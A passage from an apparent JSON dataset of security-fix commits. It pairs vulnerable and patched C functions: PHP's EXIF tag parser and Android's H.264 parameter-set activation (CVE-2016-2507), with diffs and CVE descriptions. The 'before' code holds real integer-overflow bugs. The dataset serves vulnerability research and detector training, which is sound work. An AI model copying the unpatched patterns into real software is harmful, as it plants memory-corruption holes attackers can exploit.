        "func": "static int exif_process_IFD_TAG(image_info_type *ImageInfo, char *dir_entry, char *offset_base, size_t IFDlength, size_t displacement, int section_index, int ReadNextIFD, tag_table_type tag_table TSRMLS_DC)\n{\n\tsize_t length;\n\tint tag, format, components;\n\tchar *value_ptr, tagname[64], cbuf[32], *outside=NULL;\n\tsize_t byte_count, offset_val, fpos, fgot;\n\tint64_t byte_count_signed;\n\txp_field_type *tmp_xp;\n#ifdef EXIF_DEBUG\n\tchar *dump_data;\n\tint dump_free;\n#endif /* EXIF_DEBUG */\n\n\t/* Protect against corrupt headers */\n\tif (ImageInfo->ifd_nesting_level > MAX_IFD_NESTING_LEVEL) {\n\t\texif_error_docref(\"exif_read_data#error_ifd\" EXIFERR_CC, ImageInfo, E_WARNING, \"corrupt EXIF header: maximum directory nesting level reached\");\n\t\treturn FALSE;\n\t}\n\tImageInfo->ifd_nesting_level++;\n\n\ttag = php_ifd_get16u(dir_entry, ImageInfo->motorola_intel);\n\tformat = php_ifd_get16u(dir_entry+2, ImageInfo->motorola_intel);\n\tcomponents = php_ifd_get32u(dir_entry+4, ImageInfo->motorola_intel);\n\n\tif (!format || format > NUM_FORMATS) {\n\t\t/* (-1) catches illegal zero case as unsigned underflows to positive large. */\n\t\texif_error_docref(\"exif_read_data#error_ifd\" EXIFERR_CC, ImageInfo, E_WARNING, \"Process tag(x%04X=%s): Illegal format code 0x%04X, suppose BYTE\", tag, exif_get_tagname(tag, tagname, -12, tag_table TSRMLS_CC), format);\n\t\tformat = TAG_FMT_BYTE;\n\t\t/*return TRUE;*/\n\t}\n\n\tif (components < 0) {\n\t\texif_error_docref(\"exif_read_data#error_ifd\" EXIFERR_CC, ImageInfo, E_WARNING, \"Process tag(x%04X=%s): Illegal components(%ld)\", tag, exif_get_tagname(tag, tagname, -12, tag_table TSRMLS_CC), components);\n\t\treturn FALSE;\n\t}\n\n\tbyte_count_signed = (int64_t)components * php_tiff_bytes_per_format[format];\n\n\tif (byte_count_signed < 0 || (byte_count_signed > INT32_MAX)) {\n\t\texif_error_docref(\"exif_read_data#error_ifd\" EXIFERR_CC, ImageInfo, E_WARNING, \"Process tag(x%04X=%s): Illegal byte_count\", tag, exif_get_tagname(tag, tagname, -12, tag_table TSRMLS_CC));\n\t\treturn FALSE;\n\t}\n\n\tbyte_count = (size_t)byte_count_signed;\n\n\tif (byte_count > 4) {\n\t\toffset_val = php_ifd_get32u(dir_entry+8, ImageInfo->motorola_intel);\n\t\t/* If its bigger than 4 bytes, the dir entry contains an offset. */\n\t\tvalue_ptr = offset_base+offset_val;\n\t\tif (byte_count > IFDlength || offset_val > IFDlength-byte_count || value_ptr < dir_entry) {\n\t\t\t/* It is important to check for IMAGE_FILETYPE_TIFF\n\t\t\t * JPEG does not use absolute pointers instead its pointers are\n\t\t\t * relative to the start of the TIFF header in APP1 section. */\n\t\t\tif (byte_count > ImageInfo->FileSize || offset_val>ImageInfo->FileSize-byte_count || (ImageInfo->FileType!=IMAGE_FILETYPE_TIFF_II && ImageInfo->FileType!=IMAGE_FILETYPE_TIFF_MM && ImageInfo->FileType!=IMAGE_FILETYPE_JPEG)) {\n\t\t\t\tif (value_ptr < dir_entry) {\n\t\t\t\t\t/* we can read this if offset_val > 0 */\n\t\t\t\t\t/* some files have their values in other parts of the file */\n\t\t\t\t\texif_error_docref(\"exif_read_data#error_ifd\" EXIFERR_CC, ImageInfo, E_WARNING, \"Process tag(x%04X=%s): Illegal pointer offset(x%04X < x%04X)\", tag, exif_get_tagname(tag, tagname, -12, tag_table TSRMLS_CC), offset_val, dir_entry);\n\t\t\t\t} else {\n\t\t\t\t\t/* this is for sure not allowed */\n\t\t\t\t\t/* exception are IFD pointers */\n\t\t\t\t\texif_error_docref(\"exif_read_data#error_ifd\" EXIFERR_CC, ImageInfo, E_WARNING, \"Process tag(x%04X=%s): Illegal pointer offset(x%04X + x%04X = x%04X > x%04X)\", tag, exif_get_tagname(tag, tagname, -12, tag_table TSRMLS_CC), offset_val, byte_count, offset_val+byte_count, IFDlength);\n\t\t\t\t}\n\t\t\t\treturn FALSE;\n\t\t\t}\n\t\t\tif (byte_count>sizeof(cbuf)) {\n\t\t\t\t/* mark as outside range and get buffer */\n\t\t\t\tvalue_ptr = safe_emalloc(byte_count, 1, 0);\n\t\t\t\toutside = value_ptr;\n\t\t\t} else {\n\t\t\t\t/* In most cases we only access a small range so\n\t\t\t\t * it is faster to use a static buffer there\n\t\t\t\t * BUT it offers also the possibility to have\n\t\t\t\t * pointers read without the need to free them\n\t\t\t\t * explicitley before returning. */\n\t\t\t\tmemset(&cbuf, 0, sizeof(cbuf));\n\t\t\t\tvalue_ptr = cbuf;\n\t\t\t}\n\n\t\t\tfpos = php_stream_tell(ImageInfo->infile);\n\t\t\tphp_stream_seek(ImageInfo->infile, offset_val, SEEK_SET);\n\t\t\tfgot = php_stream_tell(ImageInfo->infile);\n\t\t\tif (fgot!=offset_val) {\n\t\t\t\tEFREE_IF(outside);\n\t\t\t\texif_error_docref(NULL EXIFERR_CC, ImageInfo, E_WARNING, \"Wrong file pointer: 0x%08X != 0x%08X\", fgot, offset_val);\n\t\t\t\treturn FALSE;\n\t\t\t}\n\t\t\tfgot = php_stream_read(ImageInfo->infile, value_ptr, byte_count);\n\t\t\tphp_stream_seek(ImageInfo->infile, fpos, SEEK_SET);\n\t\t\tif (fgot<byte_count) {\n\t\t\t\tEFREE_IF(outside);\n\t\t\t\tEXIF_ERRLOG_FILEEOF(ImageInfo)\n\t\t\t\treturn FALSE;\n\t\t\t}\n\t\t}\n\t} else {\n\t\t/* 4 bytes or less and value is in the dir entry itself */\n\t\tvalue_ptr = dir_entry+8;\n\t\toffset_val= value_ptr-offset_base;\n\t}\n\n\tImageInfo->sections_found |= FOUND_ANY_TAG;\n#ifdef EXIF_DEBUG\n\tdump_data = exif_dump_data(&dump_free, format, components, length, ImageInfo->motorola_intel, value_ptr TSRMLS_CC);\n\texif_error_docref(NULL EXIFERR_CC, ImageInfo, E_NOTICE, \"Process tag(x%04X=%s,@x%04X + x%04X(=%d)): %s%s %s\", tag, exif_get_tagname(tag, tagname, -12, tag_table TSRMLS_CC), offset_val+displacement, byte_count, byte_count, (components>1)&&format!=TAG_FMT_UNDEFINED&&format!=TAG_FMT_STRING?\"ARRAY OF \":\"\", exif_get_tagformat(format), dump_data);\n\tif (dump_free) {\n\t\tefree(dump_data);\n\t}\n#endif\n\n\tif (section_index==SECTION_THUMBNAIL) {\n\t\tif (!ImageInfo->Thumbnail.data) {\n\t\t\tswitch(tag) {\n\t\t\t\tcase TAG_IMAGEWIDTH:\n\t\t\t\tcase TAG_COMP_IMAGE_WIDTH:\n\t\t\t\t\tImageInfo->Thumbnail.width = exif_convert_any_to_int(value_ptr, format, ImageInfo->motorola_intel TSRMLS_CC);\n\t\t\t\t\tbreak;\n\t\n\t\t\t\tcase TAG_IMAGEHEIGHT:\n\t\t\t\tcase TAG_COMP_IMAGE_HEIGHT:\n\t\t\t\t\tImageInfo->Thumbnail.height = exif_convert_any_to_int(value_ptr, format, ImageInfo->motorola_intel TSRMLS_CC);\n\t\t\t\t\tbreak;\n\t\n\t\t\t\tcase TAG_STRIP_OFFSETS:\n\t\t\t\tcase TAG_JPEG_INTERCHANGE_FORMAT:\n\t\t\t\t\t/* accept both formats */\n\t\t\t\t\tImageInfo->Thumbnail.offset = exif_convert_any_to_int(value_ptr, format, ImageInfo->motorola_intel TSRMLS_CC);\n\t\t\t\t\tbreak;\n\t\n\t\t\t\tcase TAG_STRIP_BYTE_COUNTS:\n\t\t\t\t\tif (ImageInfo->FileType == IMAGE_FILETYPE_TIFF_II || ImageInfo->FileType == IMAGE_FILETYPE_TIFF_MM) {\n\t\t\t\t\t\tImageInfo->Thumbnail.filetype = ImageInfo->FileType;\n\t\t\t\t\t} else {\n\t\t\t\t\t\t/* motorola is easier to read */\n\t\t\t\t\t\tImageInfo->Thumbnail.filetype = IMAGE_FILETYPE_TIFF_MM;\n\t\t\t\t\t}\n\t\t\t\t\tImageInfo->Thumbnail.size = exif_convert_any_to_int(value_ptr, format, ImageInfo->motorola_intel TSRMLS_CC);\n\t\t\t\t\tbreak;\n\t\n\t\t\t\tcase TAG_JPEG_INTERCHANGE_FORMAT_LEN:\n\t\t\t\t\tif (ImageInfo->Thumbnail.filetype == IMAGE_FILETYPE_UNKNOWN) {\n\t\t\t\t\t\tImageInfo->Thumbnail.filetype = IMAGE_FILETYPE_JPEG;\n\t\t\t\t\t\tImageInfo->Thumbnail.size = exif_convert_any_to_int(value_ptr, format, ImageInfo->motorola_intel TSRMLS_CC);\n\t\t\t\t\t}\n\t\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t} else {\n\t\tif (section_index==SECTION_IFD0 || section_index==SECTION_EXIF)\n\t\tswitch(tag) {\n\t\t\tcase TAG_COPYRIGHT:\n\t\t\t\t/* check for \"<photographer> NUL <editor> NUL\" */\n\t\t\t\tif (byte_count>1 && (length=php_strnlen(value_ptr, byte_count)) > 0) {\n\t\t\t\t\tif (length<byte_count-1) {\n\t\t\t\t\t\t/* When there are any characters after the first NUL */\n\t\t\t\t\t\tImageInfo->CopyrightPhotographer  = estrdup(value_ptr);\n\t\t\t\t\t\tImageInfo->CopyrightEditor        = estrdup(value_ptr+length+1);\n\t\t\t\t\t\tspprintf(&ImageInfo->Copyright, 0, \"%s, %s\", value_ptr, value_ptr+length+1);\n\t\t\t\t\t\t/* format = TAG_FMT_UNDEFINED; this musn't be ASCII         */\n\t\t\t\t\t\t/* but we are not supposed to change this                   */\n\t\t\t\t\t\t/* keep in mind that image_info does not store editor value */\n\t\t\t\t\t} else {\n\t\t\t\t\t\tImageInfo->Copyright = estrdup(value_ptr);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tbreak;   \n\n\t\t\tcase TAG_USERCOMMENT:\n\t\t\t\tImageInfo->UserCommentLength = exif_process_user_comment(ImageInfo, &(ImageInfo->UserComment), &(ImageInfo->UserCommentEncoding), value_ptr, byte_count TSRMLS_CC);\n\t\t\t\tbreak;\n\n\t\t\tcase TAG_XP_TITLE:\n\t\t\tcase TAG_XP_COMMENTS:\n\t\t\tcase TAG_XP_AUTHOR:\n\t\t\tcase TAG_XP_KEYWORDS:\n\t\t\tcase TAG_XP_SUBJECT:\n\t\t\t\ttmp_xp = (xp_field_type*)safe_erealloc(ImageInfo->xp_fields.list, (ImageInfo->xp_fields.count+1), sizeof(xp_field_type), 0);\n\t\t\t\tImageInfo->sections_found |= FOUND_WINXP;\n\t\t\t\tImageInfo->xp_fields.list = tmp_xp;\n\t\t\t\tImageInfo->xp_fields.count++;\n\t\t\t\texif_process_unicode(ImageInfo, &(ImageInfo->xp_fields.list[ImageInfo->xp_fields.count-1]), tag, value_ptr, byte_count TSRMLS_CC);\n\t\t\t\tbreak;\n\n\t\t\tcase TAG_FNUMBER:\n\t\t\t\t/* Simplest way of expressing aperture, so I trust it the most.\n\t\t\t\t   (overwrite previously computed value if there is one) */\n\t\t\t\tImageInfo->ApertureFNumber = (float)exif_convert_any_format(value_ptr, format, ImageInfo->motorola_intel TSRMLS_CC);\n\t\t\t\tbreak;\n\n\t\t\tcase TAG_APERTURE:\n\t\t\tcase TAG_MAX_APERTURE:\n\t\t\t\t/* More relevant info always comes earlier, so only use this field if we don't\n\t\t\t\t   have appropriate aperture information yet. */\n\t\t\t\tif (ImageInfo->ApertureFNumber == 0) {\n\t\t\t\t\tImageInfo->ApertureFNumber\n\t\t\t\t\t\t= (float)exp(exif_convert_any_format(value_ptr, format, ImageInfo->motorola_intel TSRMLS_CC)*log(2)*0.5);\n\t\t\t\t}\n\t\t\t\tbreak;\n\n\t\t\tcase TAG_SHUTTERSPEED:\n\t\t\t\t/* More complicated way of expressing exposure time, so only use\n\t\t\t\t   this value if we don't already have it from somewhere else.\n\t\t\t\t   SHUTTERSPEED comes after EXPOSURE TIME\n\t\t\t\t  */\n\t\t\t\tif (ImageInfo->ExposureTime == 0) {\n\t\t\t\t\tImageInfo->ExposureTime\n\t\t\t\t\t\t= (float)(1/exp(exif_convert_any_format(value_ptr, format, ImageInfo->motorola_intel TSRMLS_CC)*log(2)));\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase TAG_EXPOSURETIME:\n\t\t\t\tImageInfo->ExposureTime = -1;\n\t\t\t\tbreak;\n\n\t\t\tcase TAG_COMP_IMAGE_WIDTH:\n\t\t\t\tImageInfo->ExifImageWidth = exif_convert_any_to_int(value_ptr, format, ImageInfo->motorola_intel TSRMLS_CC);\n\t\t\t\tbreak;\n\n\t\t\tcase TAG_FOCALPLANE_X_RES:\n\t\t\t\tImageInfo->FocalplaneXRes = exif_convert_any_format(value_ptr, format, ImageInfo->motorola_intel TSRMLS_CC);\n\t\t\t\tbreak;\n\n\t\t\tcase TAG_SUBJECT_DISTANCE:\n\t\t\t\t/* Inidcates the distacne the autofocus camera is focused to.\n\t\t\t\t   Tends to be less accurate as distance increases. */\n\t\t\t\tImageInfo->Distance = (float)exif_convert_any_format(value_ptr, format, ImageInfo->motorola_intel TSRMLS_CC);\n\t\t\t\tbreak;\n\n\t\t\tcase TAG_FOCALPLANE_RESOLUTION_UNIT:\n\t\t\t\tswitch((int)exif_convert_any_format(value_ptr, format, ImageInfo->motorola_intel TSRMLS_CC)) {\n\t\t\t\t\tcase 1: ImageInfo->FocalplaneUnits = 25.4; break; /* inch */\n\t\t\t\t\tcase 2:\n\t\t\t\t\t\t/* According to the information I was using, 2 measn meters.\n\t\t\t\t\t\t   But looking at the Cannon powershot's files, inches is the only\n\t\t\t\t\t\t   sensible value. */\n\t\t\t\t\t\tImageInfo->FocalplaneUnits = 25.4;\n\t\t\t\t\t\tbreak;\n\n\t\t\t\t\tcase 3: ImageInfo->FocalplaneUnits = 10;   break;  /* centimeter */\n\t\t\t\t\tcase 4: ImageInfo->FocalplaneUnits = 1;    break;  /* milimeter  */\n\t\t\t\t\tcase 5: ImageInfo->FocalplaneUnits = .001; break;  /* micrometer */\n\t\t\t\t}\n\t\t\t\tbreak;\n\n\t\t\tcase TAG_SUB_IFD:\n\t\t\t\tif (format==TAG_FMT_IFD) {\n\t\t\t\t\t/* If this is called we are either in a TIFFs thumbnail or a JPEG where we cannot handle it */\n\t\t\t\t\t/* TIFF thumbnail: our data structure cannot store a thumbnail of a thumbnail */\n\t\t\t\t\t/* JPEG do we have the data area and what to do with it */\n\t\t\t\t\texif_error_docref(NULL EXIFERR_CC, ImageInfo, E_NOTICE, \"Skip SUB IFD\");\n\t\t\t\t}\n\t\t\t\tbreak;\n\n\t\t\tcase TAG_MAKE:\n\t\t\t\tImageInfo->make = estrdup(value_ptr);\n\t\t\t\tbreak;\n\t\t\tcase TAG_MODEL:\n\t\t\t\tImageInfo->model = estrdup(value_ptr);\n\t\t\t\tbreak;\n\n\t\t\tcase TAG_MAKER_NOTE:\n\t\t\t\texif_process_IFD_in_MAKERNOTE(ImageInfo, value_ptr, byte_count, offset_base, IFDlength, displacement TSRMLS_CC);\n\t\t\t\tbreak;\n\n\t\t\tcase TAG_EXIF_IFD_POINTER:\n\t\t\tcase TAG_GPS_IFD_POINTER:\n\t\t\tcase TAG_INTEROP_IFD_POINTER:\n\t\t\t\tif (ReadNextIFD) {\n\t\t\t\t\tchar *Subdir_start;\n\t\t\t\t\tint sub_section_index = 0;\n\t\t\t\t\tswitch(tag) {\n\t\t\t\t\t\tcase TAG_EXIF_IFD_POINTER:\n#ifdef EXIF_DEBUG\n\t\t\t\t\t\t\texif_error_docref(NULL EXIFERR_CC, ImageInfo, E_NOTICE, \"Found EXIF\");\n#endif\n\t\t\t\t\t\t\tImageInfo->sections_found |= FOUND_EXIF;\n\t\t\t\t\t\t\tsub_section_index = SECTION_EXIF;\n\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\tcase TAG_GPS_IFD_POINTER:\n#ifdef EXIF_DEBUG\n\t\t\t\t\t\t\texif_error_docref(NULL EXIFERR_CC, ImageInfo, E_NOTICE, \"Found GPS\");\n#endif\n\t\t\t\t\t\t\tImageInfo->sections_found |= FOUND_GPS;\n\t\t\t\t\t\t\tsub_section_index = SECTION_GPS;\n\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\tcase TAG_INTEROP_IFD_POINTER:\n#ifdef EXIF_DEBUG\n\t\t\t\t\t\t\texif_error_docref(NULL EXIFERR_CC, ImageInfo, E_NOTICE, \"Found INTEROPERABILITY\");\n#endif\n\t\t\t\t\t\t\tImageInfo->sections_found |= FOUND_INTEROP;\n\t\t\t\t\t\t\tsub_section_index = SECTION_INTEROP;\n\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t\tSubdir_start = offset_base + php_ifd_get32u(value_ptr, ImageInfo->motorola_intel);\n\t\t\t\t\tif (Subdir_start < offset_base || Subdir_start > offset_base+IFDlength) {\n\t\t\t\t\t\texif_error_docref(\"exif_read_data#error_ifd\" EXIFERR_CC, ImageInfo, E_WARNING, \"Illegal IFD Pointer\");\n\t\t\t\t\t\treturn FALSE;\n\t\t\t\t\t}\n\t\t\t\t\tif (!exif_process_IFD_in_JPEG(ImageInfo, Subdir_start, offset_base, IFDlength, displacement, sub_section_index TSRMLS_CC)) {\n\t\t\t\t\t\treturn FALSE;\n\t\t\t\t\t}\n#ifdef EXIF_DEBUG\n\t\t\t\t\texif_error_docref(NULL EXIFERR_CC, ImageInfo, E_NOTICE, \"Subsection %s done\", exif_get_sectionname(sub_section_index));\n#endif\n\t\t\t\t}\n\t\t}\n\t}\n\texif_iif_add_tag(ImageInfo, section_index, exif_get_tagname(tag, tagname, sizeof(tagname), tag_table TSRMLS_CC), tag, format, components, value_ptr TSRMLS_CC);\n\tEFREE_IF(outside);\n\treturn TRUE;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -47,11 +47,11 @@\n \t\toffset_val = php_ifd_get32u(dir_entry+8, ImageInfo->motorola_intel);\n \t\t/* If its bigger than 4 bytes, the dir entry contains an offset. */\n \t\tvalue_ptr = offset_base+offset_val;\n-\t\tif (offset_val+byte_count > IFDlength || value_ptr < dir_entry) {\n+\t\tif (byte_count > IFDlength || offset_val > IFDlength-byte_count || value_ptr < dir_entry) {\n \t\t\t/* It is important to check for IMAGE_FILETYPE_TIFF\n \t\t\t * JPEG does not use absolute pointers instead its pointers are\n \t\t\t * relative to the start of the TIFF header in APP1 section. */\n-\t\t\tif (offset_val+byte_count>ImageInfo->FileSize || (ImageInfo->FileType!=IMAGE_FILETYPE_TIFF_II && ImageInfo->FileType!=IMAGE_FILETYPE_TIFF_MM && ImageInfo->FileType!=IMAGE_FILETYPE_JPEG)) {\n+\t\t\tif (byte_count > ImageInfo->FileSize || offset_val>ImageInfo->FileSize-byte_count || (ImageInfo->FileType!=IMAGE_FILETYPE_TIFF_II && ImageInfo->FileType!=IMAGE_FILETYPE_TIFF_MM && ImageInfo->FileType!=IMAGE_FILETYPE_JPEG)) {\n \t\t\t\tif (value_ptr < dir_entry) {\n \t\t\t\t\t/* we can read this if offset_val > 0 */\n \t\t\t\t\t/* some files have their values in other parts of the file */",
        "diff_line_info": {
            "deleted_lines": [
                "\t\tif (offset_val+byte_count > IFDlength || value_ptr < dir_entry) {",
                "\t\t\tif (offset_val+byte_count>ImageInfo->FileSize || (ImageInfo->FileType!=IMAGE_FILETYPE_TIFF_II && ImageInfo->FileType!=IMAGE_FILETYPE_TIFF_MM && ImageInfo->FileType!=IMAGE_FILETYPE_JPEG)) {"
            ],
            "added_lines": [
                "\t\tif (byte_count > IFDlength || offset_val > IFDlength-byte_count || value_ptr < dir_entry) {",
                "\t\t\tif (byte_count > ImageInfo->FileSize || offset_val>ImageInfo->FileSize-byte_count || (ImageInfo->FileType!=IMAGE_FILETYPE_TIFF_II && ImageInfo->FileType!=IMAGE_FILETYPE_TIFF_MM && ImageInfo->FileType!=IMAGE_FILETYPE_JPEG)) {"
            ]
        }
    },
    {
        "cve_id": "CVE-2016-2507",
        "func_name": "android/h264bsdActivateParamSets",
        "description": "Integer overflow in codecs/on2/h264dec/source/h264bsd_storage.c in libstagefright in mediaserver in Android 4.x before 4.4.4, 5.0.x before 5.0.2, 5.1.x before 5.1.1, and 6.x before 2016-07-01 allows remote attackers to execute arbitrary code or cause a denial of service (memory corruption) via a crafted media file, aka internal bug 28532266.",
        "git_url": "https://android.googlesource.com/platform/frameworks/av/+/60547808ca4e9cfac50028c00c58a6ceb2319301",
        "commit_title": "h264bsdActivateParamSets: Prevent multiplication overflow.",
        "commit_text": " Report MEMORY_ALLOCATION_ERROR if pStorage->picSizeInMbs would exceed UINT32_MAX bytes.  Bug: 28532266 ",
        "func_before": "u32 h264bsdActivateParamSets(storage_t *pStorage, u32 ppsId, u32 isIdr)\n{\n\n/* Variables */\n\n    u32 tmp;\n    u32 flag;\n\n/* Code */\n\n    ASSERT(pStorage);\n    ASSERT(ppsId < MAX_NUM_PIC_PARAM_SETS);\n\n    /* check that pps and corresponding sps exist */\n    if ( (pStorage->pps[ppsId] == NULL) ||\n         (pStorage->sps[pStorage->pps[ppsId]->seqParameterSetId] == NULL) )\n    {\n        return(HANTRO_NOK);\n    }\n\n    /* check that pps parameters do not violate picture size constraints */\n    tmp = CheckPps(pStorage->pps[ppsId],\n                   pStorage->sps[pStorage->pps[ppsId]->seqParameterSetId]);\n    if (tmp != HANTRO_OK)\n        return(tmp);\n\n    /* first activation part1 */\n    if (pStorage->activePpsId == MAX_NUM_PIC_PARAM_SETS)\n    {\n        pStorage->activePpsId = ppsId;\n        pStorage->activePps = pStorage->pps[ppsId];\n        pStorage->activeSpsId = pStorage->activePps->seqParameterSetId;\n        pStorage->activeSps = pStorage->sps[pStorage->activeSpsId];\n        pStorage->picSizeInMbs =\n            pStorage->activeSps->picWidthInMbs *\n            pStorage->activeSps->picHeightInMbs;\n\n        pStorage->currImage->width = pStorage->activeSps->picWidthInMbs;\n        pStorage->currImage->height = pStorage->activeSps->picHeightInMbs;\n\n        pStorage->pendingActivation = HANTRO_TRUE;\n    }\n    /* first activation part2 */\n    else if (pStorage->pendingActivation)\n    {\n        pStorage->pendingActivation = HANTRO_FALSE;\n\n        FREE(pStorage->mb);\n        FREE(pStorage->sliceGroupMap);\n\n        ALLOCATE(pStorage->mb, pStorage->picSizeInMbs, mbStorage_t);\n        ALLOCATE(pStorage->sliceGroupMap, pStorage->picSizeInMbs, u32);\n        if (pStorage->mb == NULL || pStorage->sliceGroupMap == NULL)\n            return(MEMORY_ALLOCATION_ERROR);\n\n        H264SwDecMemset(pStorage->mb, 0,\n            pStorage->picSizeInMbs * sizeof(mbStorage_t));\n\n        h264bsdInitMbNeighbours(pStorage->mb,\n            pStorage->activeSps->picWidthInMbs,\n            pStorage->picSizeInMbs);\n\n        /* dpb output reordering disabled if\n         * 1) application set noReordering flag\n         * 2) POC type equal to 2\n         * 3) num_reorder_frames in vui equal to 0 */\n        if ( pStorage->noReordering ||\n             pStorage->activeSps->picOrderCntType == 2 ||\n             (pStorage->activeSps->vuiParametersPresentFlag &&\n              pStorage->activeSps->vuiParameters->bitstreamRestrictionFlag &&\n              !pStorage->activeSps->vuiParameters->numReorderFrames) )\n            flag = HANTRO_TRUE;\n        else\n            flag = HANTRO_FALSE;\n\n        tmp = h264bsdResetDpb(pStorage->dpb,\n            pStorage->activeSps->picWidthInMbs *\n            pStorage->activeSps->picHeightInMbs,\n            pStorage->activeSps->maxDpbSize,\n            pStorage->activeSps->numRefFrames,\n            pStorage->activeSps->maxFrameNum,\n            flag);\n        if (tmp != HANTRO_OK)\n            return(tmp);\n    }\n    else if (ppsId != pStorage->activePpsId)\n    {\n        /* sequence parameter set shall not change but before an IDR picture */\n        if (pStorage->pps[ppsId]->seqParameterSetId != pStorage->activeSpsId)\n        {\n            DEBUG((\"SEQ PARAM SET CHANGING...\\n\"));\n            if (isIdr)\n            {\n                pStorage->activePpsId = ppsId;\n                pStorage->activePps = pStorage->pps[ppsId];\n                pStorage->activeSpsId = pStorage->activePps->seqParameterSetId;\n                pStorage->activeSps = pStorage->sps[pStorage->activeSpsId];\n                pStorage->picSizeInMbs =\n                    pStorage->activeSps->picWidthInMbs *\n                    pStorage->activeSps->picHeightInMbs;\n\n                pStorage->currImage->width = pStorage->activeSps->picWidthInMbs;\n                pStorage->currImage->height =\n                    pStorage->activeSps->picHeightInMbs;\n\n                pStorage->pendingActivation = HANTRO_TRUE;\n            }\n            else\n            {\n                DEBUG((\"TRYING TO CHANGE SPS IN NON-IDR SLICE\\n\"));\n                return(HANTRO_NOK);\n            }\n        }\n        else\n        {\n            pStorage->activePpsId = ppsId;\n            pStorage->activePps = pStorage->pps[ppsId];\n        }\n    }\n\n    return(HANTRO_OK);\n\n}",
        "func": "u32 h264bsdActivateParamSets(storage_t *pStorage, u32 ppsId, u32 isIdr)\n{\n\n/* Variables */\n\n    u32 tmp;\n    u32 flag;\n\n/* Code */\n\n    ASSERT(pStorage);\n    ASSERT(ppsId < MAX_NUM_PIC_PARAM_SETS);\n\n    /* check that pps and corresponding sps exist */\n    if ( (pStorage->pps[ppsId] == NULL) ||\n         (pStorage->sps[pStorage->pps[ppsId]->seqParameterSetId] == NULL) )\n    {\n        return(HANTRO_NOK);\n    }\n\n    /* check that pps parameters do not violate picture size constraints */\n    tmp = CheckPps(pStorage->pps[ppsId],\n                   pStorage->sps[pStorage->pps[ppsId]->seqParameterSetId]);\n    if (tmp != HANTRO_OK)\n        return(tmp);\n\n    /* first activation part1 */\n    if (pStorage->activePpsId == MAX_NUM_PIC_PARAM_SETS)\n    {\n        pStorage->activePpsId = ppsId;\n        pStorage->activePps = pStorage->pps[ppsId];\n        pStorage->activeSpsId = pStorage->activePps->seqParameterSetId;\n        pStorage->activeSps = pStorage->sps[pStorage->activeSpsId];\n\n        /* report error before multiplication to prevent integer overflow */\n        if (pStorage->activeSps->picWidthInMbs == 0)\n        {\n            pStorage->picSizeInMbs = 0;\n        }\n        else if (pStorage->activeSps->picHeightInMbs >\n                 UINT32_MAX / pStorage->activeSps->picWidthInMbs)\n        {\n            return(MEMORY_ALLOCATION_ERROR);\n        }\n        else\n        {\n            pStorage->picSizeInMbs =\n                pStorage->activeSps->picWidthInMbs *\n                pStorage->activeSps->picHeightInMbs;\n        }\n\n        pStorage->currImage->width = pStorage->activeSps->picWidthInMbs;\n        pStorage->currImage->height = pStorage->activeSps->picHeightInMbs;\n\n        pStorage->pendingActivation = HANTRO_TRUE;\n    }\n    /* first activation part2 */\n    else if (pStorage->pendingActivation)\n    {\n        pStorage->pendingActivation = HANTRO_FALSE;\n\n        FREE(pStorage->mb);\n        FREE(pStorage->sliceGroupMap);\n\n        ALLOCATE(pStorage->mb, pStorage->picSizeInMbs, mbStorage_t);\n        ALLOCATE(pStorage->sliceGroupMap, pStorage->picSizeInMbs, u32);\n        if (pStorage->mb == NULL || pStorage->sliceGroupMap == NULL)\n            return(MEMORY_ALLOCATION_ERROR);\n\n        H264SwDecMemset(pStorage->mb, 0,\n            pStorage->picSizeInMbs * sizeof(mbStorage_t));\n\n        h264bsdInitMbNeighbours(pStorage->mb,\n            pStorage->activeSps->picWidthInMbs,\n            pStorage->picSizeInMbs);\n\n        /* dpb output reordering disabled if\n         * 1) application set noReordering flag\n         * 2) POC type equal to 2\n         * 3) num_reorder_frames in vui equal to 0 */\n        if ( pStorage->noReordering ||\n             pStorage->activeSps->picOrderCntType == 2 ||\n             (pStorage->activeSps->vuiParametersPresentFlag &&\n              pStorage->activeSps->vuiParameters->bitstreamRestrictionFlag &&\n              !pStorage->activeSps->vuiParameters->numReorderFrames) )\n            flag = HANTRO_TRUE;\n        else\n            flag = HANTRO_FALSE;\n\n        tmp = h264bsdResetDpb(pStorage->dpb,\n            pStorage->activeSps->picWidthInMbs *\n            pStorage->activeSps->picHeightInMbs,\n            pStorage->activeSps->maxDpbSize,\n            pStorage->activeSps->numRefFrames,\n            pStorage->activeSps->maxFrameNum,\n            flag);\n        if (tmp != HANTRO_OK)\n            return(tmp);\n    }\n    else if (ppsId != pStorage->activePpsId)\n    {\n        /* sequence parameter set shall not change but before an IDR picture */\n        if (pStorage->pps[ppsId]->seqParameterSetId != pStorage->activeSpsId)\n        {\n            DEBUG((\"SEQ PARAM SET CHANGING...\\n\"));\n            if (isIdr)\n            {\n                pStorage->activePpsId = ppsId;\n                pStorage->activePps = pStorage->pps[ppsId];\n                pStorage->activeSpsId = pStorage->activePps->seqParameterSetId;\n                pStorage->activeSps = pStorage->sps[pStorage->activeSpsId];\n                pStorage->picSizeInMbs =\n                    pStorage->activeSps->picWidthInMbs *\n                    pStorage->activeSps->picHeightInMbs;\n\n                pStorage->currImage->width = pStorage->activeSps->picWidthInMbs;\n                pStorage->currImage->height =\n                    pStorage->activeSps->picHeightInMbs;\n\n                pStorage->pendingActivation = HANTRO_TRUE;\n            }\n            else\n            {\n                DEBUG((\"TRYING TO CHANGE SPS IN NON-IDR SLICE\\n\"));\n                return(HANTRO_NOK);\n            }\n        }\n        else\n        {\n            pStorage->activePpsId = ppsId;\n            pStorage->activePps = pStorage->pps[ppsId];\n        }\n    }\n\n    return(HANTRO_OK);\n\n}",
